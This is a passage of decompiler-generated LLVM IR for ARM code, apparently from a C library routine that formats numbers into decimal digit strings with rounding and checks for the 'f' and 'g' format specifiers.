  %v1_11184 = add i32 %v0_11184, -96
  %v3_11184 = sub i32 95, %v0_11184
  %v4_11184 = and i32 %v3_11184, %v0_11184
  %v5_11184 = icmp slt i32 %v4_11184, 0
  store i1 %v5_11184, i1* %cpsr_v.global-to-local, align 1
  %v6_11184 = icmp slt i32 %v1_11184, 0
  store i1 %v6_11184, i1* %cpsr_n.global-to-local, align 1
  %v7_11184 = icmp eq i32 %v0_11184, 96
  store i1 %v7_11184, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-168, align 4
  %tmp242 = icmp ult i32 %v0_11184, 97
  br i1 %tmp242, label %bb185, label %.thread105

bb185:                                            ; preds = %dec_label_pc_11178
  store i32 12, i32* %r3.global-to-local, align 4
  br label %.thread105

.thread105:                                       ; preds = %dec_label_pc_11178, %bb185
  %v4_1119c = phi i32 [ 12, %bb185 ], [ 3, %dec_label_pc_11178 ]
  %v4_1119c..v1_1112c = select i1 %tmp242, i32 %v4_1119c, i32 8
  store i32 ptrtoint ([4 x i8]* @global_var_13484.392 to i32), i32* %r2.global-to-local, align 4
  %v2_111a8 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_111a8, i32* %r6.global-to-local, align 4
  %v2_111ac = add i32 %v4_1119c..v1_1112c, ptrtoint ([4 x i8]* @global_var_13484.392 to i32)
  store i32 %v2_111ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11630

.thread10:                                        ; preds = %dec_label_pc_11108
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  %v2_11234 = ptrtoint i32* %stack_var_-85 to i32
  store i32 %v2_11234, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1123c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_112ac, %.thread10
  %v3_11250 = phi i32 [ %v2_1129c, %dec_label_pc_112ac ], [ %v3_110a8, %.thread10 ]
  %v1_11250 = phi i1 [ %v5_112b0, %dec_label_pc_112ac ], [ false, %.thread10 ]
  %v0_11250 = phi i1 [ %v6_112b0, %dec_label_pc_112ac ], [ false, %.thread10 ]
  %v2_11250 = xor i1 %v1_11250, %v0_11250
  br i1 %v2_11250, label %bb187, label %bb186

bb186:                                            ; preds = %dec_label_pc_1123c
  %v4_11250 = sub i32 0, %v3_11250
  store i32 %v4_11250, i32* %r4.global-to-local, align 4
  br label %bb187

bb187:                                            ; preds = %dec_label_pc_1123c, %bb186
  %v0_11254 = phi i32 [ %v3_11250, %dec_label_pc_1123c ], [ %v4_11250, %bb186 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11254 = icmp slt i32 %v0_11254, 0
  store i1 %v1_11254, i1* %cpsr_n.global-to-local, align 1
  %v2_11254 = icmp eq i32 %v0_11254, 0
  store i1 %v2_11254, i1* %cpsr_z.global-to-local, align 1
  %v0_11270 = load i32, i32* %sl.global-to-local, align 4
  %v1_11270 = add i32 %v0_11270, 9
  store i32 %v1_11270, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_11278.dec_label_pc_11278_crit_edge, %bb187
  %v1_1128c = phi i32 [ %v1_1128c.pre, %dec_label_pc_11278.dec_label_pc_11278_crit_edge ], [ %v1_11270, %bb187 ]
  %v0_11284 = phi i32 [ %v0_112a0, %dec_label_pc_11278.dec_label_pc_11278_crit_edge ], [ 0, %bb187 ]
  %v0_11290 = phi i32 [ %v2_1129c, %dec_label_pc_11278.dec_label_pc_11278_crit_edge ], [ %v0_11254, %bb187 ]
  %v2_11280 = urem i32 %v0_11290, 10
  %v1_11284 = add i32 %v0_11284, 1
  store i32 %v1_11284, i32* %r5.global-to-local, align 4
  %v1_11288 = or i32 %v2_11280, 48
  store i32 %v1_11288, i32* %r2.global-to-local, align 4
  %v2_1128c = sub i32 %v1_1128c, %v1_11284
  store i32 %v2_1128c, i32* %r3.global-to-local, align 4
  store i32 %v0_11290, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_11298 = trunc i32 %v1_11288 to i8
  %v3_11298 = inttoptr i32 %v2_1128c to i8*
  store i8 %v1_11298, i8* %v3_11298, align 1
  %v0_1129c = load i32, i32* %r0.global-to-local, align 4
  %v1_1129c = load i32, i32* %r1.global-to-local, align 4
  %v2_1129c = udiv i32 %v0_1129c, %v1_1129c
  store i32 %v2_1129c, i32* %r0.global-to-local, align 4
  %v0_112a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_112a0 = add i32 %v0_112a0, -8
  %v3_112a0 = sub i32 7, %v0_112a0
  %v4_112a0 = and i32 %v3_112a0, %v0_112a0
  %v5_112a0 = icmp slt i32 %v4_112a0, 0
  store i1 %v5_112a0, i1* %cpsr_v.global-to-local, align 1
  %v6_112a0 = icmp slt i32 %v1_112a0, 0
  store i1 %v6_112a0, i1* %cpsr_n.global-to-local, align 1
  %v7_112a0 = icmp eq i32 %v0_112a0, 8
  store i1 %v7_112a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1129c, i32* %r4.global-to-local, align 4
  %v7_112a8 = icmp slt i32 %v0_112a0, 9
  br i1 %v7_112a8, label %dec_label_pc_11278.dec_label_pc_11278_crit_edge, label %dec_label_pc_112ac

dec_label_pc_11278.dec_label_pc_11278_crit_edge:  ; preds = %dec_label_pc_11278
  %v1_1128c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11278

dec_label_pc_112ac:                               ; preds = %dec_label_pc_11278
  %v0_112ac = load i32, i32* %r6.global-to-local, align 4
  %v1_112ac = add i32 %v0_112ac, 1
  store i32 %v1_112ac, i32* %r6.global-to-local, align 4
  %v3_112b0 = sub i32 -1, %v0_112ac
  %v4_112b0 = and i32 %v1_112ac, %v3_112b0
  %v5_112b0 = icmp slt i32 %v4_112b0, 0
  store i1 %v5_112b0, i1* %cpsr_v.global-to-local, align 1
  %v6_112b0 = icmp slt i32 %v0_112ac, 0
  store i1 %v6_112b0, i1* %cpsr_n.global-to-local, align 1
  %v7_112b0 = icmp eq i32 %v0_112ac, 0
  store i1 %v7_112b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112b0, label %dec_label_pc_1123c, label %dec_label_pc_112b8

dec_label_pc_112b8:                               ; preds = %dec_label_pc_112ac
  %v0_112b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_112b8 = add i32 %v0_112b8, -96
  %v3_112b8 = sub i32 95, %v0_112b8
  %v4_112b8 = and i32 %v3_112b8, %v0_112b8
  %v5_112b8 = icmp slt i32 %v4_112b8, 0
  store i1 %v5_112b8, i1* %cpsr_v.global-to-local, align 1
  %v6_112b8 = icmp slt i32 %v1_112b8, 0
  store i1 %v6_112b8, i1* %cpsr_n.global-to-local, align 1
  %v7_112b8 = icmp eq i32 %v0_112b8, 96
  store i1 %v7_112b8, i1* %cpsr_z.global-to-local, align 1
  %tmp243 = icmp ult i32 %v0_112b8, 97
  br i1 %tmp243, label %bb188, label %thread-pre-split

bb188:                                            ; preds = %dec_label_pc_112b8
  %v5_112c4 = add i32 %v0_112b8, 32
  store i32 %v5_112c4, i32* %r3.global-to-local, align 4
  %v5_112c8 = urem i32 %v5_112c4, 256
  store i32 %v5_112c8, i32* %r7.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_112b8, %bb188
  %stack_var_-66.0108114 = phi i8 [ 69, %bb188 ], [ %tmp151, %dec_label_pc_112b8 ]
  %v0_112e8 = phi i32 [ %v5_112c8, %bb188 ], [ %v0_112b8, %dec_label_pc_112b8 ]
  %v7_112cc = icmp eq i32 %v0_112e8, 103
  %.229 = zext i1 %v7_112cc to i32
  store i32 %.229, i32* %r3.global-to-local, align 4
  %v0_112d8 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_112d8 = icmp slt i32 %v0_112d8, 0
  store i1 %v1_112d8, i1* %cpsr_n.global-to-local, align 1
  %v2_112d8 = icmp eq i32 %v0_112d8, 0
  store i1 %v2_112d8, i1* %cpsr_z.global-to-local, align 1
  %tmp191 = icmp slt i32 %v0_112d8, 1
  br i1 %tmp191, label %.thread13, label %bb192

.thread13:                                        ; preds = %thread-pre-split
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb194

bb192:                                            ; preds = %thread-pre-split
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_112e0 = icmp eq i1 %v7_112cc, false
  store i1 %v2_112e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112e0, label %bb194, label %bb193

bb193:                                            ; preds = %bb192
  %v2_112e4 = add i32 %v0_112d8, -1
  store i32 %v2_112e4, i32* %r8.global-to-local, align 4
  br label %bb194

bb194:                                            ; preds = %.thread13, %bb192, %bb193
  %v0_112f4 = phi i32 [ %v0_112d8, %.thread13 ], [ %v0_112d8, %bb192 ], [ %v2_112e4, %bb193 ]
  %v1_112e8 = add i32 %v0_112e8, -102
  %v3_112e8 = sub i32 101, %v0_112e8
  %v4_112e8 = and i32 %v3_112e8, %v0_112e8
  %v5_112e8 = icmp slt i32 %v4_112e8, 0
  store i1 %v5_112e8, i1* %cpsr_v.global-to-local, align 1
  %v6_112e8 = icmp slt i32 %v1_112e8, 0
  store i1 %v6_112e8, i1* %cpsr_n.global-to-local, align 1
  %v7_112e8 = icmp eq i32 %v0_112e8, 102
  store i1 %v7_112e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_112e8, label %dec_label_pc_112f4, label %bb195

bb195:                                            ; preds = %bb194
  store i32 %v0_112f4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11318

dec_label_pc_112f4:                               ; preds = %bb194
  %v1_112f4 = load i32, i32* %sb.global-to-local, align 4
  %v2_112f4 = add i32 %v1_112f4, %v0_112f4
  store i32 %v2_112f4, i32* %ip.global-to-local, align 4
  %v2_112f8 = add i32 %v2_112f4, 1
  %v4_112f8 = sub i32 0, %v2_112f4
  %v5_112f8 = and i32 %v2_112f8, %v4_112f8
  %v6_112f8 = icmp slt i32 %v5_112f8, 0
  store i1 %v6_112f8, i1* %cpsr_v.global-to-local, align 1
  %v7_112f8 = icmp slt i32 %v2_112f8, 0
  store i1 %v7_112f8, i1* %cpsr_n.global-to-local, align 1
  %v8_112f8 = icmp eq i32 %v2_112f8, 0
  store i1 %v8_112f8, i1* %cpsr_z.global-to-local, align 1
  %v6_112fc = icmp slt i32 %v2_112f4, -1
  br i1 %v6_112fc, label %dec_label_pc_11300, label %dec_label_pc_11318

dec_label_pc_11300:                               ; preds = %dec_label_pc_112f4
  %v2_11300 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_11300, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_1130c = bitcast i32* %stack_var_-87 to i8*
  %v3_1130c = call i32 @__GI_memset(i8* %v2_1130c, i32 48)
  store i32 %v3_1130c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_112f4, %bb195, %dec_label_pc_11300
  %v1_1135c69 = phi i32 [ %v2_1129c, %bb195 ], [ %v3_1130c, %dec_label_pc_11300 ], [ %v2_1129c, %dec_label_pc_112f4 ]
  %v1_11340 = phi i32 [ %v0_112f4, %bb195 ], [ -1, %dec_label_pc_11300 ], [ %v2_112f4, %dec_label_pc_112f4 ]
  %v1_1131c = add i32 %v1_11340, -16
  %v3_1131c = sub i32 15, %v1_11340
  %v4_1131c = and i32 %v3_1131c, %v1_11340
  %v5_1131c = icmp slt i32 %v4_1131c, 0
  store i1 %v5_1131c, i1* %cpsr_v.global-to-local, align 1
  %v6_1131c = icmp slt i32 %v1_1131c, 0
  store i1 %v6_1131c, i1* %cpsr_n.global-to-local, align 1
  %v7_1131c = icmp eq i32 %v1_11340, 16
  store i1 %v7_1131c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-86, align 4
  %v2_11328 = ptrtoint i32* %stack_var_-87 to i32
  store i32 %v2_11328, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-87, align 4
  %v7_11330 = icmp sgt i32 %v1_11340, 16
  br i1 %v7_11330, label %.thread18, label %dec_label_pc_1133c

.thread18:                                        ; preds = %dec_label_pc_11318
  store i32 0, i32* %r0.global-to-local, align 4
  %v10_11334 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v10_11334, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_1133c:                               ; preds = %dec_label_pc_11318
  %v2_1133c = ptrtoint i32* %stack_var_-86 to i32
  %v2_11340 = add i32 %v1_11340, %v2_1133c
  store i32 %v2_11340, i32* %r3.global-to-local, align 4
  %v1_11344 = add i32 %v2_11340, 2
  %v2_11344 = inttoptr i32 %v1_11344 to i8*
  %v3_11344 = load i8, i8* %v2_11344, align 1
  %v4_11344 = zext i8 %v3_11344 to i32
  store i32 %v4_11344, i32* %r2.global-to-local, align 4
  store i32 %v1_11344, i32* %r1.global-to-local, align 4
  %v2_1134c = icmp ugt i8 %v3_11344, 51
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_1134c = icmp ult i8 %v3_11344, 52
  store i1 %v6_1134c, i1* %cpsr_n.global-to-local, align 1
  %v7_1134c = icmp eq i8 %v3_11344, 52
  store i1 %v7_1134c, i1* %cpsr_z.global-to-local, align 1
  %v2_11350 = xor i1 %v2_1134c, true
  %v3_11350 = or i1 %v7_1134c, %v2_11350
  br i1 %v3_11350, label %bb196, label %bb197

bb196:                                            ; preds = %dec_label_pc_1133c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_1133c, %bb196
  %v1_1135c68 = phi i32 [ %v1_1135c69, %dec_label_pc_1133c ], [ 0, %bb196 ]
  %v2_11354 = xor i1 %v7_1134c, true
  %v3_11354 = and i1 %v2_1134c, %v2_11354
  br i1 %v3_11354, label %bb198, label %.preheader

bb198:                                            ; preds = %bb197
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %.thread18, %bb197, %bb198, %.backedge
  %v1_1135c = phi i32 [ %v1_1135c.pre, %.backedge ], [ 0, %.thread18 ], [ %v1_1135c68, %bb197 ], [ 1, %bb198 ]
  %v0_11358 = phi i32 [ %v0_11364, %.backedge ], [ %v10_11334, %.thread18 ], [ %v1_11344, %bb197 ], [ %v1_11344, %bb198 ]
  %v1_11358 = add i32 %v0_11358, -1
  %v2_11358 = inttoptr i32 %v1_11358 to i8*
  %v3_11358 = load i8, i8* %v2_11358, align 1
  %v4_11358 = zext i8 %v3_11358 to i32
  store i32 %v1_11358, i32* %r1.global-to-local, align 4
  %v2_1135c = add i32 %v4_11358, %v1_1135c
  store i32 %v2_1135c, i32* %r3.global-to-local, align 4
  %v1_11360 = trunc i32 %v2_1135c to i8
  store i8 %v1_11360, i8* %v2_11358, align 1
  %v0_11364 = load i32, i32* %r1.global-to-local, align 4
  %v1_11364 = inttoptr i32 %v0_11364 to i8*
  %v2_11364 = load i8, i8* %v1_11364, align 1
  %v3_11364 = zext i8 %v2_11364 to i32
  store i32 %v3_11364, i32* %r2.global-to-local, align 4
  %v2_11368 = icmp ugt i8 %v2_11364, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11368 = icmp ult i8 %v2_11364, 57
  store i1 %v6_11368, i1* %cpsr_n.global-to-local, align 1
  %v7_11368 = icmp eq i8 %v2_11364, 57
  store i1 %v7_11368, i1* %cpsr_z.global-to-local, align 1
  %v2_1136c = xor i1 %v2_11368, true
  %v3_1136c = or i1 %v7_11368, %v2_1136c
  br i1 %v3_1136c, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_11370 = xor i1 %v7_11368, true
  %v3_11370 = and i1 %v2_11368, %v2_11370
  br i1 %v3_11370, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_11378.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_11378 = phi i32 [ %v1_11378.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_11374 = icmp ult i8 %v2_11364, 48
  store i1 %v6_11374, i1* %cpsr_n.global-to-local, align 1
  %v7_11374 = icmp eq i8 %v2_11364, 48
  store i1 %v7_11374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11374, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_11378 = or i32 %v1_11378, 1
  store i32 %v2_11378, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1137c21 = icmp slt i32 %v2_11378, 0
  store i1 %v1_1137c21, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1137c = icmp slt i32 %v1_11378, 0
  store i1 %v1_1137c, i1* %cpsr_n.global-to-local, align 1
  %v2_1137c = icmp eq i32 %v1_11378, 0
  store i1 %v2_1137c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1137c, label %dec_label_pc_11384, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_1135c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_11384:                               ; preds = %bb203
  store i32 %v2_11328, i32* %r2.global-to-local, align 4
  %v2_11388 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_11388, i32* %r3.global-to-local, align 4
  %v2_1138c = sub i32 %v0_11364, %v2_11388
  %v3_1138c = icmp uge i32 %v0_11364, %v2_11388
  %v4_1138c = xor i32 %v0_11364, %v2_11388
  %v5_1138c = xor i32 %v2_1138c, %v0_11364
  %v6_1138c = and i32 %v5_1138c, %v4_1138c
  %v7_1138c = icmp slt i32 %v6_1138c, 0
  store i1 %v7_1138c, i1* %cpsr_v.global-to-local, align 1
  %v8_1138c = icmp slt i32 %v2_1138c, 0
  store i1 %v8_1138c, i1* %cpsr_n.global-to-local, align 1
  %v9_1138c = icmp eq i32 %v0_11364, %v2_11388
  store i1 %v9_1138c, i1* %cpsr_z.global-to-local, align 1
  %v2_11390 = xor i1 %v3_1138c, true
  %v3_11390 = or i1 %v9_1138c, %v2_11390
  br i1 %v3_11390, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_11384
  store i32 %v2_11388, i32* %r2.global-to-local, align 4
  store i32 %v2_11388, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_11384, %bb204
  %v2_113ac = phi i32 [ %v2_11388, %bb204 ], [ %v0_11364, %dec_label_pc_11384 ]
  %v4_1139c123 = phi i32 [ %v2_11388, %bb204 ], [ %v2_11328, %dec_label_pc_11384 ]
  %v2_11398 = xor i1 %v9_1138c, true
  %v3_11398 = and i1 %v3_1138c, %v2_11398
  br i1 %v3_11398, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_11398 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_11398, i32* %r0.global-to-local, align 4
  %v5_1139c = add i32 %v4_1139c123, 2
  store i32 %v5_1139c, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_11390, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_113a0 = load i32, i32* %sb.global-to-local, align 4
  %v5_113a0 = add i32 %v4_113a0, 1
  store i32 %v5_113a0, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_113a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_113a8 = add i32 %v0_113a8, -103
  %v3_113a8 = sub i32 102, %v0_113a8
  %v4_113a8 = and i32 %v3_113a8, %v0_113a8
  %v5_113a8 = icmp slt i32 %v4_113a8, 0
  store i1 %v5_113a8, i1* %cpsr_v.global-to-local, align 1
  %v6_113a8 = icmp slt i32 %v1_113a8, 0
  store i1 %v6_113a8, i1* %cpsr_n.global-to-local, align 1
  %v7_113a8 = icmp eq i32 %v0_113a8, 103
  store i1 %v7_113a8, i1* %cpsr_z.global-to-local, align 1
  %v3_113ac = add i32 %v2_113ac, 1
  %v4_113ac = inttoptr i32 %v3_113ac to i8*
  store i8 0, i8* %v4_113ac, align 1
  %v0_113b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_113b0 = add i32 %v0_113b0, 1
  store i32 %v1_113b0, i32* %r1.global-to-local, align 4
  %v0_113b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_113b4, label %bb208, label %dec_label_pc_113e4

bb208:                                            ; preds = %bb207
  %v0_113b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_113b8 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_113bc = icmp sge i32 %v1_113b8, %v0_113b8
  %. = zext i1 %not.v7_113bc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_113c4 = add i32 %v0_113b8, 4
  %v4_113c4 = sub i32 0, %v0_113b8
  %v5_113c4 = and i32 %v2_113c4, %v4_113c4
  %v6_113c4 = icmp slt i32 %v5_113c4, 0
  store i1 %v6_113c4, i1* %cpsr_v.global-to-local, align 1
  %v7_113c4 = icmp slt i32 %v2_113c4, 0
  store i1 %v7_113c4, i1* %cpsr_n.global-to-local, align 1
  %v8_113c4 = icmp eq i32 %v2_113c4, 0
  store i1 %v8_113c4, i1* %cpsr_z.global-to-local, align 1
  %v5_113c8 = icmp slt i32 %v0_113b8, -4
  br i1 %v5_113c8, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_113cc = icmp eq i1 %not.v7_113bc, false
  store i1 %v2_113cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_113cc, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_113d029 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_113d029, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_113f0

bb210:                                            ; preds = %bb209
  %v3_113d4 = sub i32 %v1_113b8, %v0_113b8
  store i32 %v3_113d4, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_113fc

dec_label_pc_113e4:                               ; preds = %bb207
  %v0_113e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_113e4 = add i32 %v0_113e4, -102
  %v3_113e4 = sub i32 101, %v0_113e4
  %v4_113e4 = and i32 %v3_113e4, %v0_113e4
  %v5_113e4 = icmp slt i32 %v4_113e4, 0
  store i1 %v5_113e4, i1* %cpsr_v.global-to-local, align 1
  %v6_113e4 = icmp slt i32 %v1_113e4, 0
  store i1 %v6_113e4, i1* %cpsr_n.global-to-local, align 1
  %v7_113e4 = icmp eq i32 %v0_113e4, 102
  store i1 %v7_113e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_113e4, i32* %sl.global-to-local, align 4
  br i1 %v7_113e4, label %dec_label_pc_113e4.dec_label_pc_113fc_crit_edge, label %dec_label_pc_113f0

dec_label_pc_113e4.dec_label_pc_113fc_crit_edge:  ; preds = %dec_label_pc_113e4
  %v0_113fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_113fc

dec_label_pc_113f0:                               ; preds = %.thread, %dec_label_pc_113e4
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1140c

dec_label_pc_113fc:                               ; preds = %bb210, %dec_label_pc_113e4.dec_label_pc_113fc_crit_edge
  %v0_113fc = phi i32 [ %v0_113fc.pre, %dec_label_pc_113e4.dec_label_pc_113fc_crit_edge ], [ %v0_113b8, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_113fc = icmp slt i32 %v0_113fc, 0
  store i1 %v1_113fc, i1* %cpsr_n.global-to-local, align 1
  %v2_113fc = icmp eq i32 %v0_113fc, 0
  store i1 %v2_113fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_113fc, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_113fc
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_11404 = load i32, i32* %r2.global-to-local, align 4
  %v6_11404 = add i32 %v5_11404, -1
  %v7_11404 = inttoptr i32 %v6_11404 to i8*
  store i8 48, i8* %v7_11404, align 1
  %v8_11404 = load i32, i32* %r2.global-to-local, align 4
  %v9_11404 = add i32 %v8_11404, -1
  store i32 %v9_11404, i32* %r2.global-to-local, align 4
  %v0_11408.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_11438.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_1143c.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1143c.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_113fc, %bb211
  %v1_1143c.pre = phi i1 [ %v1_1143c.pre.pre, %bb211 ], [ false, %dec_label_pc_113fc ]
  %v0_1143c.pre = phi i1 [ %v0_1143c.pre.pre, %bb211 ], [ false, %dec_label_pc_113fc ]
  %v1_11438.pre = phi i32 [ %v1_11438.pre.pre, %bb211 ], [ %v1_113b0, %dec_label_pc_113fc ]
  %v0_11408 = phi i32 [ %v0_11408.pre, %bb211 ], [ %v0_113fc, %dec_label_pc_113fc ]
  store i32 %v0_11408, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1140c

dec_label_pc_1140c:                               ; preds = %dec_label_pc_113f0, %bb212
  %v0_114dc = phi i32 [ 0, %dec_label_pc_113f0 ], [ %v0_11408, %bb212 ]
  %v1_11440 = phi i1 [ false, %dec_label_pc_113f0 ], [ %v1_1143c.pre, %bb212 ]
  %v0_11440 = phi i1 [ false, %dec_label_pc_113f0 ], [ %v0_1143c.pre, %bb212 ]
  %v1_11438 = phi i32 [ %v1_113b0, %dec_label_pc_113f0 ], [ %v1_11438.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_11418 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_11418, i32* %r3.global-to-local, align 4
  %v0_11424 = load i32, i32* %r2.global-to-local, align 4
  %v1_11424 = inttoptr i32 %v0_11424 to i8*
  %v2_11424 = load i8, i8* %v1_11424, align 1
  %v3_11424 = zext i8 %v2_11424 to i32
  store i32 %v3_11424, i32* %r3.global-to-local, align 4
  %v5_11424 = add i32 %v0_11424, 1
  store i32 %v5_11424, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_11424, i32* %stack_var_-46, align 4
  %v2_11438 = sub i32 %v1_11438, %v5_11424
  store i32 %v2_11438, i32* %r1.global-to-local, align 4
  %v2_1143c = xor i1 %v1_11440, %v0_11440
  br i1 %v2_1143c, label %.thread127, label %dec_label_pc_11444

.thread127:                                       ; preds = %dec_label_pc_1140c
  %v5_1143c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_1143c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_114ec

dec_label_pc_11444:                               ; preds = %dec_label_pc_1140c
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_11448 = sub i32 %v0_114dc, %v2_11438
  %v4_11448 = xor i32 %v2_11438, %v0_114dc
  %v5_11448 = xor i32 %v2_11448, %v0_114dc
  %v6_11448 = and i32 %v5_11448, %v4_11448
  %v7_11448 = icmp slt i32 %v6_11448, 0
  store i1 %v7_11448, i1* %cpsr_v.global-to-local, align 1
  %v8_11448 = icmp slt i32 %v2_11448, 0
  store i1 %v8_11448, i1* %cpsr_n.global-to-local, align 1
  %v9_11448 = icmp eq i32 %v0_114dc, %v2_11438
  store i1 %v9_11448, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_11454 = xor i1 %v8_11448, %v7_11448
  br i1 %v2_11454, label %bb214, label %dec_label_pc_11458

dec_label_pc_11458:                               ; preds = %dec_label_pc_11444
  store i32 %v2_11448, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_11448, i1* %cpsr_n.global-to-local, align 1
  %v2_1145c = icmp eq i32 %v2_11448, 0
